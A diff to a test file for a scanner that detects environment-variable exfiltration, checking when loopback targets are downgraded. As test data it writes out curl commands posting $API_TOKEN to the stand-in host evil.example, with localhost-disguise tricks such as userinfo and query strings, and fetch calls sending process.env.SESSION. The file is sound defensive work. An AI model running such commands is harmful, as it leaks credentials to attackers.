@@ -267,11 +267,13 @@ describe('downgrade contexts', () => {
   it('exfiltration to localhost downgrades; a localhost mention elsewhere does not', () => {
     const r = 'exfiltration/env-to-network';
     expect(one(file('a.py', 'requests.post("http://localhost:8080/s", json=dict(os.environ))\n'), r).downgraded).toBe('target is localhost');
-    expect(one(file('a.js', 'fetch(`http://127.0.0.1:${port}/s`, { body: process.env.SESSION })\n'), r).downgraded).toBe('target is localhost');
+    expect(one(file('a.js', 'fetch("http://127.0.0.1:8080/s", { body: process.env.SESSION })\n'), r).downgraded).toBe('target is localhost');
     for (const t of [
       'curl -d "t=$API_TOKEN" https://evil.example/?h=localhost\n',
       'curl -d "t=$API_TOKEN" http://localhost:80@evil.example/\n',
       'curl -d "t=$API_TOKEN" http://localhost:1/ https://evil.example/\n',
     ]) expect(one(file('a.sh', t), r).severity, t).toBe('critical');
+    // P2-R12 5 (round 4): an interpolated template is not a loopback literal (`${port}` can be `1@evil.example`).
+    expect(one(file('a.js', 'fetch(`http://127.0.0.1:${port}/s`, { body: process.env.SESSION })\n'), r).severity).toBe('critical');
   });
 });
